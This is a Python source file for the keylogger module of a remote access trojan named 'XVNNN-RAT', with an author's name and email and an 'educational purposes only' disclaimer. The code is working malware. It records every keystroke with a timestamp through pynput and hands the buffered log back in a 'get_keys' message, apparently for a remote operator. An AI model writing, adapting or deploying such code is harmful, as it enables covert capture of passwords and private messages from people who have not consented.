"""
Keylogger module for XVNNN-RAT
Author: Ali Zafar (alizafarbati@gmail.com)
Note: This module is for educational/research purposes only.
"""

from pynput import keyboard
import time
import logging

logger = logging.getLogger(__name__)

class KeyloggerModule:
    """Keylogger module - for educational purposes only"""
    
    def __init__(self):
        self.name = "keylogger"
        self.running = False
        self.logs = []
        self.max_logs = 1000
        self.listener = None
    
    def start(self):
        """Start keylogger"""
        if self.running:
            return {'type': 'start_keylogger', 'status': 'already running'}
        
        try:
            self.running = True
            self.logs = []
            
            def on_press(key):
                try:
                    char = key.char
                except:
                    char = str(key)
                
                timestamp = time.strftime("%H:%M:%S")
                self.logs.append(f"[{timestamp}] {char}")
                
                if len(self.logs) > self.max_logs:
                    self.logs.pop(0)
            
            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.start()
            
            logger.info("Keylogger started")
            return {'type': 'start_keylogger', 'status': 'success'}
        except Exception as e:
            logger.error(f"Keylogger start error: {e}")
            return {'type': 'start_keylogger', 'error': str(e)}
    
    def stop(self):
        """Stop keylogger"""
        if self.listener:
            self.listener.stop()
        self.running = False
        logger.info("Keylogger stopped")
        return {'type': 'stop_keylogger', 'status': 'success'}
    
    def get_logs(self):
        """Get keylog data"""
        logs_text = '\n'.join(self.logs)
        self.logs = []  # Clear after retrieval
        return {'type': 'get_keys', 'keys': logs_text}